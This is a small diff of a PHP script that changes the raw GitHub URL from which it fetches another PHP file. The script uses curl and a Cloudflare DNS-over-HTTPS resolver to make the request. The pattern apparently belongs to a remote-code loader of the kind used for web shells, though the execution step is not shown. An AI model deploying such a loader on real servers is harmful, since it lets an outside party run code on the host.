@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/Jenderal92/KC5/refs/heads/master/mek.php';
+$url = 'https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/index.php';
 $dns = 'https://cloudflare-dns.com/dns-query';
 
 $ch = curl_init($url);
